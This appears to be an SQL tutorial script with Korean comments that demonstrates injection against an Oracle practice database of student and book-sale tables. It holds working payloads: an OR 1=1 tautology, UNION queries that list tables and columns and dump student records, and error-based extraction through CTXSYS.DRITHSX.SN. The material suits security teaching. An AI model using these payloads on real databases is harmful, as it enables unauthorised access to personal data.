-- SQL 삽입 공격 예제 쿼리
SELECT * FROM STUDENT;

-- 공격자가 STUDENT 테이블의 정보를 탈취하려고 함
-- 제공되는 기능이 학번을 입력하면 해당 학번에 대한 정보만 보여줌
-- 공격자가 학번을 모르는 상태에서 1234 임의로 보냄 -> 정보가 표현되지 않음
SELECT * FROM STUDENT
WHERE STDNO = '1234';

-- 사용자의 입력값이 1234' OR 1=1 -- 라면, 전달된 OR절에 의해서 앞의 STDNO는 무력화됨
SELECT * FROM STUDENT
WHERE STDNO = '1234' OR 1=1 --';
;

-- 특정 STDNO에 대한 학생의 정보만 확인하도록 하는 것이 목적임
-- SQL 취약점인 OR 절에 의해서 모든 학생의 정보가 조회 될 수 있음

-- union 키워드
-- 두개의 질의 결과를 결합하기 위한 쿼리

SELECT CLIENTNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '1'
UNION
SELECT CLIENTNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '2';

-- UNION 되는 컬럼이 동일하지 않아도 타입이 동일하면 결과가 출력
SELECT CLIENTNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '1'
UNION
SELECT BOOKNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '2'; -- CLIENTNO 와 BOOKNO 의 타입이 동일하기 때문에 오류 없이 결과가 출력

-- UNION 되는 컬럼의 타입이 다르면 오류 발생 : 대응하는 식과 같은 데이터 유형이어야 합니다
SELECT CLIENTNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '1'
UNION
SELECT BOOKNO, BSDATE FROM BOOKSALE WHERE CLIENTNO = '2';

-- UNION 되는 질의 결과의 컬럼 수가 다르면 오류 발생 : 질의 블록은 부정확한 수의 결과 열을 가지고 있습니다
SELECT CLIENTNO, BSQTY FROM BOOKSALE WHERE CLIENTNO = '1'
UNION
SELECT BOOKNO, BSQTY, BSDATE FROM BOOKSALE WHERE CLIENTNO = '2';

-- UNION 은 결합되는 질의 결과의 컬럼수가 같아야 하고, 매핑되는 컬럼들간의 타입이 동일해야 함

-- 컬럼수가 다르면 NULL을 활용
SELECT CLIENTNO, BSQTY, NULL FROM BOOKSALE WHERE CLIENTNO = '1'
UNION
SELECT BOOKNO, BSQTY, BSDATE FROM BOOKSALE WHERE CLIENTNO = '2';

-- BOOKSALE 테이블과 BOOK 테이블간의 결합
SELECT BOOKNO, BSQTY, BSDATE FROM BOOKSALE WHERE CLIENTNO = '2'
UNION
SELECT NULL, NULL, NULL FROM BOOK;
-- BOOK이라는 테이블이 있고 컬럼은 3개 NULL값 사용 가능

-- ORDER BY 절 사용 
SELECT * FROM BOOK
ORDER BY BOOKNAME; -- 컬럼명 사용

SELECT * FROM BOOK
ORDER BY 2; -- 컬럼 번호 사용

SELECT * FROM BOOK
ORDER BY 8; -- 8번 컬럼은 없음

-- DUAL 테이블과 UNION 예제 (제대로 실행됨)
SELECT * FROM STUDENT WHERE STDNO= '' OR 1=1
UNION
SELECT NULL, NULL, NULL, NULL, NULL, NULL FROM DUAL;

SELECT * FROM USER_TABLES;

-- 테이블 이름을 알면 컬럼 이름도 알 수 있음
SELECT * FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

SELECT * FROM STUDENT WHERE STDNO= '' OR 1=1
UNION
SELECT COLUMN_NAME, NULL, NULL, NULL, NULL, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

-- 중복 레코드 제거후 반환
SELECT * FROM STUDENT WHERE STDNO = '' OR 1=1
UNION
SELECT STDADDRESS, TO_CHAR(STDBIRTH), TO_NUMBER(DPTNO), NULL, NULL, NULL FROM STUDENT;

-- Error-Based SQL Injection
-- 오라클의 버전 확인
SELECT banner FROM v$version WHERE banner LIKE '%Oracle%';

-- 취약한 프로시저 활용해서 위 쿼리를 서브쿼리로 실행하고 에러 유발
-- CTXSYS.DRITHSX.SN(param1,param2) : param2는 서브쿼리여야 함
-- CTXSYS.DRITHSX.SN 두번째 파라미터 서브쿼리 결과를 활용해서 다음 검색을 진행함
-- 서브쿼리 결과는 검색에 이용할 수 있는 키워드여야 함
-- 키워드가 사용불가하다면 키워드에 해당하는 문구를 출력해 줌
SELECT CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE banner LIKE '%Oracle%')) FROM DUAL;

SELECT * FROM student WHERE stdNo = '2023001'
AND CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE banner LIKE '%Oracle%')) = 1;

SELECT * FROM student WHERE stdNo = '2023001'
AND CTXSYS.DRITHSX.SN(user, (SELECT COUNT(table_name) FROM user_tables)) = 1;

SELECT table_name FROM (SELECT table_name, ROWNUM AS rnum FROM user_tables)
WHERE rnum = 1;






